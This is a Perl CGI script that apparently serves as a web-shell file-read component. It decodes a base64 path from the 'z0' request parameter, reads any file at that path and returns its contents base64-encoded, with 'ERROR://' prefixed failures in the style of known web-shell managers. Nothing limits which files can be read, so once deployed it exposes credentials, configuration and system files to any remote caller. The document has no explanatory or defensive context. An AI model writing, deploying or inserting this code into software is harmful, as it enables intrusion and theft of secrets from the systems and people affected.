use strict;
use warnings;
use CGI;
use MIME::Base64;

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';

    my $file_path = decode_base64($z0);

    if (!-e $file_path) {
        die "ERROR://Cannot find file: " . $file_path;
    }

    my $file_data = '';
    
    if (open(my $fh, '<', $file_path)) {
        binmode($fh);
        
        local $/; 
        $file_data = <$fh>;
        
        close($fh);
    } else {
        die "ERROR://Cannot open file: " . $file_path;
    }

    print encode_base64($file_data, '');
}

main();